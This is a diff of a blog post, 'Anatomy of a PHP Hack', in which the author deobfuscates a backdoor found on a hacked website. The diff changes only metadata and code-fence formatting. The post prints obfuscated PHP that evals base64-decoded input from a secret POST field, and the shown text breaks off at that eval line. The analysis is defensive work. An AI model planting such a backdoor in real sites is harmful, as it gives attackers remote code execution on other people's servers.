@@ -1,13 +1,15 @@
 ---
-layout: post
 title: Anatomy of a PHP Hack
+date: 2017-11-07
 tags:
 - php
 - security
 ---
 It's hard to come up with a title for this - but - basically I found some rogue code the other day that I thought was pretty interesting. I was fixing a "hacked" website when I came across the source of the symptoms of the hack.  One file had the following code in it:
 
-```php?start_inline=1
+<!--more-->
+
+```php
 $zgjv56 = "o_esb4da6ctp" ; 
 $fzba02= strtolower( $zgjv56[4].$zgjv56[7].$zgjv56[3].$zgjv56[2] . $zgjv56[8].$zgjv56[5].$zgjv56[1] . $zgjv56[6]. $zgjv56[2].$zgjv56[9].$zgjv56[0].$zgjv56[6].$zgjv56[2] );
 $gfc4 =strtoupper ( $zgjv56[1]. $zgjv56[11].$zgjv56[0]. $zgjv56[3].$zgjv56[10] ) ; 
@@ -45,7 +47,7 @@ So, this variable is targeting the magic/global PHP variable `$_POST` - ok - I'm
 
 This PHP line gives us the indicator of what wakes up the script:
 
-```php?start_inline=1
+```php
 if( isset( ${ $gfc4 }['n89024b' ] )){
 
 // translates to:
@@ -54,7 +56,7 @@ if (isset($_POST['n89024b'])) {
 
 Again, a random variable/string in `n89024b` - but this says - if there is a post request to this page using the variable `n89024b` - we should do something.  That variable name is very likely not to be picked by the main application - so it's safe for this script to accept/intercept those values and do it's task.
 
-```php?start_inline=1
+```php
 eval( $fzba02 (${$gfc4 } [ 'n89024b' ] )) ;
 
 // translates to
